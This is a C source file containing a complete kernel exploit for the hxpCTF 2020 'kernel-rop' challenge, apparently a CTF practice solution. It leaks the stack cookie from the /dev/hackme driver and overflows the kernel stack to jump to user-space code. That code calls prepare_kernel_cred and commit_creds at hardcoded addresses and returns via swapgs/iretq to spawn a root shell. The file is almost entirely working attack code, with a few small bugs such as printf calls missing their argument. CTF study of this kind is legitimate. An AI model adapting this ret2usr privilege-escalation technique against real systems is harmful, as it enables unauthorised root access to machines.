// hxpCTF 2020 kernel-rop Exploit
// No protections

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int device_fd;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

void pwn(){
    puts("[*] Spawning shell on user land");
    uid_t uid = getuid();

    if (uid == 0){
        printf("[+] UID: %d, got root!");
    } else {
        printf("[-] UID: %d, could ot get root.");
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) pwn;

void open_device(){
    device_fd = open("/dev/hackme", O_RDWR);
    if (device_fd < 0){
        puts("Failed to open /dev/hackme");
        exit(-1);
    } else {
        puts("Device /dev/hackme openned");
    }
}

// 0xffffffff814c6410 commit_creds
// 0xffffffff814c67f0 prepare_kernel_cred
void privesc(){
    __asm__(
        ".intel_syntax noprefix;" // define intel syntax
        "movabs rax, 0xffffffff814c67f0;" // prepare_kernel_cred function address
        "xor rdi, rdi;" // set rdi to 0, by calling convention, rdi is the first function argument
        "call rax;" // call rax to execute prepare_kernel_cred
        "mov rdi, rax;" // prepare_kernel_cred function returns value to rax; so mov the value of rax to rdi as first argument of commit_creds
        "movabs rax, 0xffffffff814c6410;" // mov absolute address of commit_creds to rax
        "call rax;" // call commit_creds function
        "swapgs;" // swap gs register to user mode

        // setting up RIP|CS|RFLAGS|SP|SS registers for iretq. Going back to user mode
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"

        "iretq;" // context switch to user mode

        ".att_syntax;"
    );
}

unsigned long stack_cookie;
void get_stack_cookie(){
    // int tmp[32] has 32*4 of size = 128
    unsigned long stack[0x14]; // sizeof(unsigned long) = 8; 0x14 = 20
    // if stack cookie is right after tmp var in stack, stack cookie sould be in position position 16 of local stack array
    ssize_t r = read(device_fd, stack, sizeof(stack)); // 0x3a811aed457f8a00

    stack_cookie = stack[16];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Stack cookie: %lx\n", stack_cookie);

}

void overflow(void){
    puts("[*] Trying to rewrite ret addr");

    unsigned long payload[25];

    payload[16] = stack_cookie;
    payload[17] = 0x0;
    payload[18] = 0x0;
    payload[19] = 0x0;
    payload[20] = (unsigned long) privesc;

    write(device_fd, payload, sizeof(payload));

}

void save_registers_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;" // push lower 16 bits of EFLAGS Register Onto the Stack
        "pop user_rflags;" // put first stack value (eflags)
        ".att_syntax;"
    );
}

int main(){
    open_device();
    get_stack_cookie();
    save_registers_state();
    overflow();
}
// $rdi = 0xffffc90000193e08 → 0xffffc90000193ef0 → 0x0000000000000000
// $rsi = 0xffffffffc0002440 → 0x00000000004b2fe0 → 0x0000000000000000
// 0xffffc900001bfe08 stack addr